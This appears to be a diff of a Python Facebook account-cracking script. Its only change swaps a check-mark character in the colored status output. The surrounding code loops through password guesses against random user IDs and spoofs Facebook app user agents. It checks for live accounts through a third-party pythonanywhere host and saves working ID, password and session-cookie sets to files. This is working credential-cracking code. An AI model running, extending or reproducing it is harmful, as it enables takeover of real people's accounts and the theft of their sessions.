     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -1185,14 +1185,14 @@ def randm(ids,psd,tl):
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                 res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                 if res == 'LIVE':
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
                     oks.append(ids)
                     open('/sdcard/ERROR-M1-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
-                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
+                    #print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     break
             elif 'www.facebook.com' in q['error_msg']:
                 cps.append(ids)
-                #print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
+                #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
                 open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
         loop+=1
     except Exception as e:
@@ -1201,7 +1201,7 @@ def randm(ids,psd,tl):
 def randm1(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -1264,14 +1264,14 @@ def randm1(ids,psd,tl):
                 ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                     oks.append(ids)
                     open('/sdcard/ERROR-M2-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
-                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
+                    #print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     break
             elif 'www.facebook.com' in q['error_msg']:
                 cps.append(ids)
-                #print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
+                #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
                 open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')                
         loop+=1
     except requests.exceptions.ConnectionError:
@@ -1283,7 +1283,7 @@ def randm1(ids,psd,tl):
 def randm2(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -1345,14 +1345,14 @@ def randm2(ids,psd,tl):
                 ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                     oks.append(ids)
                     open('/sdcard/ERROR-M3-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
-                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
+                    #print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     break
             elif 'www.facebook.com' in q['error_msg']:
                 cps.append(ids)
-                #print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
+                #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
                 open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
                 break
             else:
@@ -1367,7 +1367,7 @@ def randm2(ids,psd,tl):
 def randm3(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';{R4}',
     session=requests.Session()
@@ -1385,14 +1385,14 @@ def randm3(ids,psd,tl):
                 ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
-                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
+                    #print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     oks.append(ids)
                     open('/sdcard/ERROR-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                     break
                 else:pass
             if 'checkpoint' in log_cookies:
-                #print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
+                #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
                 open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
